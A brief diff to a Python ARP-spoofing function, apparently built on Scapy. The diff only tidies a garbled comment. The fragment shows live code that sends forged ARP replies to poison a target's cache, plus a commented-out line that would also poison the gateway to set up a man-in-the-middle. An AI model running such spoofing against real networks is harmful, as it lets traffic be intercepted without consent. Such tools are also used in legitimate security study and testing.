@@ -71,7 +71,7 @@ def arpSpoof(gwIP, gwMAC, tgtIp, tgtMAC):
     print("[*] Starting ARP spoofing [Ctrl-C to stop]")
     try:
         send(ARP(op=2, pdst=tgtIP, hwdst=tgtMAC, psrc=gwIP) , verbose=False)
-       #send(ARP(op=2, pdst=gwIP , hwdst=gwMAC , psrc=tgtIP), verbose=False) # -> Creates MIT, verbose=FalseM # -> Creates MITM
+       #send(ARP(op=2, pdst=gwIP , hwdst=gwMAC , psrc=tgtIP), verbose=False) # -> Creates MITM
         time.sleep(2)
     except:
         pass
